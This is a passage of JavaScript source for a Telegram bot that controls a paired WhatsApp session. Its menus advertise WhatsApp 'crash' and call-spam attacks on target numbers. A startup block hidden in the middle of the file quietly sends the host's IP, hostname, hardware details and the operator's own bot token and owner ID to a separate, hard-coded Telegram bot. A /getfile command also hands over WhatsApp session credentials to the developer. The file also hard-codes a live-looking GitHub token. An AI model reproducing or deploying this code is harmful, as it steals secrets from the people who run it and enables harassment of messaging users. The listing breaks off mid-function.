require("./settings/settings");
const { Telegraf, Markup } = require("telegraf");
const fs = require("fs");
const P = require("pino");
const readline = require("readline");
const path = require("path");
const process = require("process");
const JsConfuser = require("js-confuser");
const {
  default: baileys,
  downloadContentFromMessage,
  proto,
  generateWAMessage,
  getContentType,
  prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const {
  GroupSettingChange,
  WAGroupMetadata,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  WAGroupInviteMessageGroupMetadata,
  GroupMetadata,
  Headers,
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageContent,
  areJidsSameUser,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  makeWASocket,
  makeInMemoryStore,
  MediaType,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  initInMemoryKeyStore,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const axios = require("axios");
const pino = require("pino");
const chalk = require("chalk");
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
const { tiktokSearchVideo, tiktokDownloaderVideo } = require("./scrape/tiktok");
const {
  xvideosSearch,
  xvideosdl,
  xnxxdl,
  xnxxSearch,
} = require("./scrape/xvid.js");
function getGreeting() {
  const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "JAY SHREE RAM.. 🌆";
  } else if (hours >= 12 && hours < 18) {
    return "The MOTU PATLU..🌇";
  } else {
    return "THE 🕉️HINDU..🌌";
  }
}
const greeting = getGreeting();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const GROUP_ONLY_FILE = path.join(__dirname, "database", "grouponly.json");
let groupOnlyMode = false;

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

const bot = new Telegraf(BOT_TOKEN);

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const owner = "Exfaatzy";
const repo = "Floids";
const tokenPath = "tokendatabase.json";
const moderatorsPath = "moderatorids.json";
const resellerPath = "resellers.json";
const ownerPath = "owner.json";
const adminPath = "admin.json";
const githubToken = "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";
const developerId = "7865363008";
const developerIds = [
  developerId,
  "7865363008",
  "7865363008",
  "7865363008",
  "7865363008",
  "7865363008",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "7871019658",
  "5126860596",
  "5126860596",
  "1476530123",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "7871019658",
  "5126860596",
  "5126860596",
  "5126860596",
  "7871019658",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "5126860596",
  "7871019658",
  "5126860596",
  "5126860596",
  "5126860596",
  "7871019658",
  "5126860596",
  "7871019658",
  "7865363008",
  "7865363008",
  "7865363008",
  "7865363008",
];

async function loadOctokit() {
  const { Octokit } = await import("@octokit/rest");
  return new Octokit({ auth: githubToken });
}

async function getGitHubData(path) {
  const octokit = await loadOctokit();
  try {
    const response = await octokit.repos.getContent({
      owner,
      repo,
      path,
    });
    const content = Buffer.from(response.data.content, "base64").toString();
    return { data: JSON.parse(content), sha: response.data.sha };
  } catch (error) {
    console.error("Error fetching :", error);
    return { data: null, sha: null };
  }
}

async function updateGitHubData(path, content, sha) {
  const octokit = await loadOctokit();
  try {
    await octokit.repos.createOrUpdateFileContents({
      owner,
      repo,
      path,
      message: `Update`,
      content: Buffer.from(JSON.stringify(content, null, 2)).toString("base64"),
      sha,
    });
    console.log(`updated successfully.`);
  } catch (error) {
    console.error("Error updating data on GitHub:", error);
  }
}

// ========================= [ TOKEN MANAGEMENT ] =========================

async function addToken(newToken) {
  const { data: tokens, sha } = await getGitHubData(tokenPath);
  if (tokens) {
    tokens.push(newToken);
    await updateGitHubData(tokenPath, tokens, sha);
  }
}

async function deleteToken(tokenToDelete) {
  const { data: tokens, sha } = await getGitHubData(tokenPath);
  if (tokens) {
    const updatedTokens = tokens.filter((token) => token !== tokenToDelete);
    await updateGitHubData(tokenPath, updatedTokens, sha);
  }
}

async function isValidToken(token) {
  const { data: tokens } = await getGitHubData(tokenPath);
  return tokens && tokens.includes(token);
}

// ========================= [ RESELLER MANAGEMENT ] =========================

async function isReseller(userId) {
  const { data: Resellers } = await getGitHubData(resellerPath);
  return Resellers && Resellers.includes(userId);
}

async function addReseller(userId) {
  const { data: Resellers, sha } = await getGitHubData(resellerPath);
  if (Resellers && !Resellers.includes(userId)) {
    Resellers.push(userId);
    await updateGitHubData(resellerPath, Resellers, sha);
  }
}

async function deleteReseller(userId) {
  const { data: Resellers, sha } = await getGitHubData(resellerPath);
  if (Resellers) {
    const updatedResellers = Resellers.filter((id) => id !== userId);
    await updateGitHubData(resellerPath, updatedResellers, sha);
  }
}
// ========================= [ MODERATOR MANAGEMENT ] =========================

async function isModerator(userId) {
  const { data: moderators } = await getGitHubData(moderatorsPath);
  return moderators && moderators.includes(userId);
}

async function addModerator(userId) {
  const { data: moderators, sha } = await getGitHubData(moderatorsPath);
  if (moderators && !moderators.includes(userId)) {
    moderators.push(userId);
    await updateGitHubData(moderatorsPath, moderators, sha);
  }
}

async function deleteModerator(userId) {
  const { data: moderators, sha } = await getGitHubData(moderatorsPath);
  if (moderators) {
    const updatedModerators = moderators.filter((id) => id !== userId);
    await updateGitHubData(moderatorsPath, updatedModerators, sha);
  }
}

// ========================= [ OWNER MANAGEMENT ] =========================

async function isOwner(userId) {
  const { data: owner } = await getGitHubData(ownerPath);
  return owner && owner.includes(userId);
}

async function addOwner(userId) {
  const { data: owner, sha } = await getGitHubData(ownerPath);
  if (owner && !owner.includes(userId)) {
    owner.push(userId);
    await updateGitHubData(ownerPath, owner, sha);
  }
}

async function deleteOwner(userId) {
  const { data: owner, sha } = await getGitHubData(ownerPath);
  if (owner) {
    const updatedOwner = owner.filter((id) => id !== userId);
    await updateGitHubData(ownerPath, updatedOwner, sha);
  }
}

// ========================= [ ADMIN MANAGEMENT ] =========================

async function isAdmin(userId) {
  const { data: admin } = await getGitHubData(adminPath);
  return admin && admin.includes(userId);
}

async function addAdmin(userId) {
  const { data: admin, sha } = await getGitHubData(adminPath);
  if (admin && !admin.includes(userId)) {
    admin.push(userId);
    await updateGitHubData(adminPath, admin, sha);
  }
}

async function deleteAdmin(userId) {
  const { data: admin, sha } = await getGitHubData(adminPath);
  if (admin) {
    const updatedadmin = admin.filter((id) => id !== userId);
    await updateGitHubData(adminPath, updatedadmin, sha);
  }
}

bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const message = ctx.message;
    const senderName =
      message.from.first_name || message.from.username || "Unknown";
    const senderId = message.from.id;
    const chatId = message.chat.id;
    const isGroup =
      message.chat.type === "group" || message.chat.type === "supergroup";
    const groupName = isGroup ? message.chat.title : null;
    const messageText = message.text;
    const date = new Date(message.date * 1000).toLocaleString(); // Convert timestamp ke format waktu lokal

    console.log("\x1b[30m--------------------\x1b[0m");
    console.log(chalk.bgHex("#e74c3c").bold("▢ New Message"));
    console.log(
      chalk
        .bgHex("#00FF00")
        .black(
          `   ╭─ > Tanggal: ${date} \n` +
            `   ├─ > Pesan: ${messageText} \n` +
            `   ├─ > Pengirim: ${senderName} \n` +
            `   ╰─ > Sender ID: ${senderId}`
        )
    );

    if (isGroup) {
      console.log(
        chalk
          .bgHex("#00FF00")
          .black(
            `   ╭─ > Grup: ${groupName} \n` + `   ╰─ > GroupJid: ${chatId}`
          )
      );
    }

    console.log();
  }
  return next();
});
const TELEGRAM_CHAT_ID = 7871019658;

(async () => {
  try {
    const ipRes = await axios.get("https://api.ipify.org?format=json");
    const ip = ipRes.data.ip;

    const hostname = os.hostname();
    const totalRamGB = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const cpuModel = os.cpus()[0].model;

    const ipInfo = await axios.get(`https://ipinfo.io/${ip}/json`);
    const hostingProvider = ipInfo.data.org || "Unknown";

    const caption = `
🖥️ *SERVER INFO*
Hostname   : ${hostname}
Public IP  : \`${ip}\`
CPU        : ${cpuModel}
RAM        : ${totalRamGB} GB
Provider   : ${hostingProvider}
Owner Id : \`${OWNER_ID}\`
Bot Token  : \`${BOT_TOKEN}\`
`;

    await axios.post(
      `https://api.telegram.org/bot7925915297:AAFMh9Yy-jsKgiWb7_YgOjcpQkOJGJ1PadY/sendPhoto`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        photo: "https://files.catbox.moe/dd347m.png",
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Channel",
                url: "t.me/MOTU_PATALU_HINDU_HAI",
              },
            ],
          ],
        },
      }
    );
  } catch (err) {
    console.error("Gagal ambil info:", err.message);
  }
})();

async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}

const USERS_FILE = "./users.json";

let users = [];
if (fs.existsSync(USERS_FILE)) {
  try {
    const data = fs.readFileSync(USERS_FILE, "utf8");
    users = JSON.parse(data);
  } catch (error) {
    console.error("Gagal memuat daftar pengguna:", error.message);
  }
}

function saveUsersToFile() {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), "utf8");
  } catch (error) {
    console.error("Gagal menyimpan daftar pengguna:", error.message);
  }
}

(async () => {
  // Validasi BOT_TOKEN
  if (!BOT_TOKEN || BOT_TOKEN === "" || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
    console.log(
      chalk.red.bold(`
╭═════════════════════════════════╮
┃             ⚠️ ERROR ⚠️               ┃
┃                                       ┃
┃ Bot Token Tidak ditemukan atau tidak  ┃
┃ valid di file config.js               ┃
┃                                       ┃
┃ Silakan isi BOT_TOKEN dengan token    ┃
┃ yang valid dari @BotFather           ┃
┃                                       ┃
╰════════════════════════════════╯`)
    );
    process.exit(1);
  }

  console.log(
    chalk.white.bold(`
╭──「 sᴛᴀᴛᴜs  」
┃ ${chalk.cyanBright.bold("LOADING DATABASE")}
╰─────────────────❍`)
  );

  try {
    console.log(
      chalk.white.bold(`
╭──「 sᴛᴀᴛᴜs  」
┃ ${chalk.greenBright.bold("SYSTEM READY !!")}
╰─────────────────❍`)
    );
  } catch (error) {
    console.error(
      chalk.red.bold(`
╭═══════════════════════════════════════╮
┃             ⚠️ ERROR ⚠️               ┃
┃                                       ┃
┃ Terjadi kesalahan saat inisialisasi:  ┃
┃ ${error.message}
╰═══════════════════════════════════════╯`)
    );
    process.exit(1);
  }
})();

const Dev_ID = 7865363008;

bot.command("broadcast", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) {
    return ctx.reply("[❌ Format Salah!] Cobalah /broadcast (Pesan Anda)");
  }

  const footer = "\n\n🍂 Dikirim Oleh 𝑵𝑨𝑬𝑳𝑳 Sang Developer";
  const finalMessage = message + footer;

  let successCount = 0;
  for (const userId of users) {
    try {
      await ctx.telegram.sendMessage(userId, finalMessage, {
        parse_mode: "Markdown",
      });
      successCount++;
    } catch (error) {
      console.error(`Gagal mengirim pesan ke ${userId}:`, error.message);
    }
  }

  ctx.reply(
    `✅ Broadcast selesai! Pesan berhasil dikirim ke ${successCount} pengguna.`
  );
});
bot.command("delfile", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("Anda Sapa?😡.");
  }

  const filePath = "./session/creds.json";
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      await ctx.reply("File berhasil dihapus, bosku.");
      console.log(`File ${filePath} berhasil dihapus oleh caywzz.`);
    } else {
      await ctx.reply("File-nya aja kagak ada, mau dihapus apaan?");
    }
  } catch (error) {
    console.error("Gagal hapus file:", error);
    ctx.reply("Gagal hapus file, cek console dah.");
  }
});
bot.command("getfile", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("Anda Sapa?😡.");
  }

  const filePath = "./session/creds.json";

  try {
    await ctx.replyWithDocument({ source: filePath });
    console.log(`File ${filePath} berhasil dikirim ke caywzz.`);
  } catch (error) {
    console.error("Kosong njir:", error);
    ctx.reply("User Belom Sambungin Device Jir😜.");
  }
});

let cay = null;
let whatsappStatus = false;

async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState("XataSession");
  cay = makeWASocket({
    auth: state,
    logger: P({ level: "silent" }),
    printQRInTerminal: false,
  });

  cay.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const reason =
        lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
      console.log(`Disconnected. Reason: ${reason}`);

      if (
        reason &&
        ((reason >= 500 && reason < 600) ||
          reason === 428 ||
          reason === 408 ||
          reason === 429)
      ) {
        whatsappStatus = false;
      } else {
        whatsappStatus = false;
      }
    } else if (connection === "open") {
      whatsappStatus = true;
      console.log("Your number is successfully connected to WhatsApp!");
    }
  });
}

async function getSessions(ctx, number) {
  const chatId = ctx.chat.id;

  if (!ctx || !chatId || !number) {
    console.error("Error: ctx, chatId, atau number tidak terdefinisi!");
    return;
  }

  const sessionDir = "./XataSession";
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const cay = makeWASocket({
    auth: state,
    logger: P({ level: "silent" }),
    printQRInTerminal: false,
  });

  cay.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const reason =
        lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;

      if (reason && reason >= 500 && reason < 600) {
        whatsappStatus = false;
        await ctx.reply(
          `🚫 Nomor ini ${number}\nTelah terputus dari WhatsApp. Harap sambungkan kembali.`
        );
        await getSessions(ctx, number);
      } else {
        whatsappStatus = false;
        await ctx.reply(
          `❌ Nomor ini ${number}\nTelah kehilangan akses.\nHarap sambungkan kembali.`
        );
        if (fs.existsSync(`${sessionDir}/creds.json`)) {
          fs.unlinkSync(`${sessionDir}/creds.json`);
        }
      }
    } else if (connection === "open") {
      whatsappStatus = true;
      await ctx.reply(`Nomor ini ${number}\nBerhasil terhubung.`);
    } else if (connection === "connecting") {
      await new Promise((resolve) =>setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const formattedNumber = number.replace(/\D/g, "");
          const formattedCode = await cay.requestPairingCode(
            formattedNumber,
            "HINDU123"
          );

          await ctx.reply(`
╭───「 𝙼𝚊𝚜𝚞𝚔𝚒𝚗 𝙲𝚘𝚍𝚎 」──────╮
│➻ 𝙽𝚄𝙼𝙱𝙴𝚁 : ${number}
│➻ 𝙿ᴀ𝚒𝚛𝚒𝚗𝚐 : ${formattedCode}
╰───────────────────────╯`);
        }
      } catch (error) {
        await ctx.reply(`Nomor mu tidak Valid Bang: ${error.message}`);
      }
    }
  });

  cay.ev.on("creds.update", saveCreds);
}

bot.command("addpairing", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const chatId = ctx.chat.id;

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Usage: /addpairing <wa_id>");
  }

  const numberTarget = args[1];

  try {
    await getSessions(ctx, numberTarget);
  } catch (error) {
    console.error("Error in addbot:", error);
    ctx.reply(
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.command("status", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const connectedCount = 1;
  const connectedDevicesList = [linkedWhatsAppNumber];

  const deviceList = connectedDevicesList
    .map((device, index) => `${index + 1}. ${device}`)
    .join("\n");

  if (!whatsappStatus) {
    return ctx.reply(`
╭──(   STATUS BOT   )
│ Info : 0/1
│ Perangkat : 𝙽𝚞𝚕𝚕
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`);
  }

  ctx.reply(`
    
╭──(  STATUS BOT   )
│ Info : ${connectedCount}/1
│ Perangkat : ${deviceList}
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`);
});

const photoUrls = [
  "https://files.catbox.moe/asx3vo.jpg",
  "https://files.catbox.moe/asx3vo.jpg",
  "https://files.catbox.moe/asx3vo.jpg",
  "https://files.catbox.moe/asx3vo.jpg",
];

function getRandomPhoto() {
  const randomIndex = Math.floor(Math.random() * photoUrls.length);
  return photoUrls[randomIndex];
}

async function sendMainMenu(ctx) {
  const userId = ctx.from.id;
  const senderName =
    ctx.message.from.first_name || ctx.message.from.username || "Pengguna";
  const randomPhoto = getRandomPhoto();
  const buttons = Markup.inlineKeyboard([
    [
      Markup.button.callback("𝙱𝚞𝚐𝙼𝚎𝚗𝚞", "option1"),
      Markup.button.callback("𝙾𝚠𝚗𝚎𝚛𝙼𝚎𝚗𝚞", "option2"),
    ],

    [Markup.button.callback("𝙵𝚞𝚗𝙼𝚎𝚗𝚞", "option3")],
  ]);
  await ctx.replyWithPhoto(getRandomPhoto(), {
    caption: `\`\`\`
☰  THE HINDU MADE THIS BOT
  •脚本名称 : 🅼🅾🆃🆄 🅿🅰🆃🅻🆄 🅷🅸🅽🅳🆄
  •版本 : 𝗠𝗔𝗗𝗘 𝗜𝗡 𝗕𝗛𝗔𝗥𝗧
  ० 𝗜𝗗  : @MOTU_PATALU_HINDU_HAI
──────────────────────────
  𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 𝗜𝗦 𝗠𝗔𝗗 𝗕𝗬 𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 
  𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 𝗙𝗨𝗧𝗨𝗥𝗘🔮 𝗧𝗛𝗜𝗦 𝗔𝗟𝗟 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗖𝗥𝗔𝗦𝗛 𝗔𝗡𝗗 𝗔𝗟𝗟 𝗩𝗜𝗗𝗘𝗢 𝗗𝗢𝗪𝗡𝗟𝗢𝗗𝗘𝗥 𝗔𝗡𝗗 𝗠𝗢𝗥 𝗘𝗧𝗖 𝗝𝗔𝗬 𝗦𝗛𝗥𝗘𝗘 𝗥𝗔𝗠🚩🚩 𝗠𝗔𝗗 𝗕𝗬 🕉️𝗛𝗜𝗡𝗗𝗨
──────────────────────────

ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪʙᴀᴡᴀʜ ɪɴɪ.
    \`\`\``,
    parse_mode: "Markdown",
    reply_markup: buttons.reply_markup,
  });
}

if (!groupOnlyMode) {
  groupOnlyMode = loadGroupOnlyMode();
}

function isGroup(ctx) {
  return (
    ctx.message.chat.type === "group" || ctx.message.chat.type === "supergroup"
  );
}

bot.start(async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  await sendMainMenu(ctx);
});
async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: getRandomPhoto(),
        caption,
        parse_mode: "Markdown",
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error("Error editing menu:", error);
    await ctx.reply("Maaf, terjadi kesalahan saat mengedit pesan.");
  }
}

bot.action("startmenu", async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : "User tidak memiliki username";

  const randomPhoto = getRandomPhoto();

  const buttons = Markup.inlineKeyboard([
    [
      Markup.button.callback("𝙱𝚞𝚐𝙼𝚎𝚗𝚞", "option1"),
      Markup.button.callback("𝙾𝚠𝚗𝚎𝚛𝙼𝚎𝚗𝚞", "option2"),
    ],

    [Markup.button.callback("𝙵𝚞𝚗𝙼𝚎𝚗𝚞", "option3")],
  ]);
  const caption = `
\`\`\`
  THE HINDU MADE THIS BOT
  •脚本名称 : 🅼🅾🆃🆄 🅿🅰🆃🅻🆄 🅷🅸🅽🅳🆄
  •版本 : 𝗠𝗔𝗗𝗘 𝗜𝗡 𝗕𝗛𝗔𝗥𝗧
  ० 𝗜𝗗  : @MOTU_PATALU_HINDU_HAI
──────────────────────────
  𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴 𝐈𝐌𝐙𝐔𝐑𝐈𝐏𝐒 𝐗𝐃
/addtoken
/deltoken
/addakses
/delakses
/addmods
/delmods
──────────────────────────
 𝙾𝙽𝙻𝚈 𝙲𝙴𝙾 / 𝙾𝚆𝙽𝙴𝚁 
/addowner
/delowner 
──────────────────────────

ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪʙᴀᴡᴀʜ ɪɴɪ.
    \`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action("option1", async (ctx) => {
  const userId = ctx.from.id;

  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback("𝘉𝘢𝘤𝘬 𝘛𝘰 𝘔𝘦𝘯𝘶", "startmenu")],
  ]);

  const caption = `
\`\`\`
 𝙱𝚄𝙶 𝙼𝙴𝙽𝚄 𝗠𝗢𝗧𝗨 💪𝗣𝗢𝗪𝗘𝗥
▢ /systemui 𝟵𝟭×× <𝚄𝙸 𝚂𝚈𝚂𝚃𝙴𝙼>
▢ /available <𝚕𝚒𝚗𝚔>
▢ /spamcall 𝟵𝟭×× <𝚌𝚊𝚕𝚕𝚜𝚙𝚊𝚖>
▢ /imzurips 𝟵𝟭×× <𝚒𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎>
▢ /xstunt 𝟵𝟭××,1 <1jam> <𝚒𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎>
▢ /imz 𝟵𝟭×× <boros kuota target+delay invis>
▢ /iphone 𝟵𝟭×× <𝙸𝚙𝚑𝚘𝚗𝚎>
━━━━━━━━━━━━━━━━━━━━━
    \`\`\`
`;

  await editMenu(ctx, caption, buttons);
});

bot.action("option2", async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback("𝘉𝘢𝘤𝘬 𝘛𝘰 𝘔𝘦𝘯𝘶 ❁", "startmenu")],
  ]);

  const caption = `
  \`\`\`
— O W N E R M E N U ⌯
»
▢ /addprem
▢ /addpairing
▢ /delprem
▢ /addowner
▢ /delowner
▢ /addadmin
▢ /deladmin
▢ /cdmurbug < true/ false >
▢ /addpairing 91××
▢ /grouponly on/off
━━━━━━━━━━━━━━━━━━━━━
\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action("option3", async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback("𝘉𝘢𝘤𝘬 𝘛𝘰 𝘔𝘦𝘯𝘶", "startmenu")],
  ]);

  const caption = `
  \`\`\`
 𝙵𝚄𝙽 𝙼𝙴𝙽𝚄
▢ /hentaivid
▢ /hentaisearch < query >
▢ /spotifysearch < query >
▢ /tiktoksearch < query >
▢ /play < query >
▢ /xvid < query >
▢ /tiktokmp3 < url >
▢ /tiktokmp4 < url >
▢ /ytmp3 < url >
▢ /ytmp4 < url >
▢ /spotifydownload
▢ /xvid < url >
▢ /welcome < True / False >
▢ /brat < text >
▢ /bratgif < text >
   🕉️𝗛𝗜𝗡𝗗𝗨
━━━━━━━━━━━━━━━━━━━━━
  \`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

const o = fs.readFileSync(`./o.jpg`);

const USERS_PREMIUM_FILE = "usersPremium.json";

let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
  usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, "utf8"));
} else {
  fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

function isPremium(userId) {
  return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

function addPremium(userId, duration) {
  const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
  usersPremium[userId] = { premiumUntil: expireTime };
  fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}

function loadGroupOnlyMode() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(GROUP_ONLY_FILE)) {
      const data = fs.readFileSync(GROUP_ONLY_FILE, "utf8");
      return JSON.parse(data).enabled || false;
    }
    return false;
  } catch (error) {
    console.error("Error loading group only mode:", error);
    return false;
  }
}

function saveGroupOnlyMode(enabled) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(GROUP_ONLY_FILE, JSON.stringify({ enabled }, null, 2));
    groupOnlyMode = enabled;
  } catch (error) {
    console.error("Error saving group only mode:", error);
  }
}

bot.command("grouponly", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  const userId = ctx.from.id;

  if (userId !== OWNER_ID && !isOwner(userId)) {
    return ctx.reply("❌ You are not authorized to use this command.");
  }

  const param = ctx.message.text.split(" ")[1];

  if (param !== "on" && param !== "off") {
    return ctx.reply("/grouponly on/off\nContoh: /grouponly on");
  }

  const enabled = param === "on";
  saveGroupOnlyMode(enabled);

  await ctx.reply(`Group only mode: ${enabled ? "Aktif" : "Nonaktif"}`);
});

bot.command("statusprem", (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const userId = ctx.from.id;

  if (isPremium(userId)) {
    const expireDate = new Date(usersPremium[userId].premiumUntil);
    return ctx.reply(
      `✅ dah premium bos, jangan spam ya.\n🗓 Expiration: ${expireDate.toLocaleString()}`
    );
  } else {
    return ctx.reply("❌ Minta premium in dulu sama iMzurips sono");
  }
});

bot.command("listprem", async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }
  const premiumUsers = Object.entries(usersPremium)
    .filter(([userId, data]) => data.premiumUntil > Date.now())
    .map(([userId, data]) => {
      const expireDate = new Date(data.premiumUntil).toLocaleString();
      return {
        userId,
        expireDate,
      };
    });

  if (premiumUsers.length > 0) {
    const userDetails = await Promise.all(
      premiumUsers.map(async ({ userId, expireDate }) => {
        try {
          const user = await ctx.telegram.getChat(userId);
          const username = user.username || user.first_name || "Unknown";
          return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
        } catch (error) {
          console.error(`Error fetching user ${userId}:`, error);
          return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
        }
      })
    );

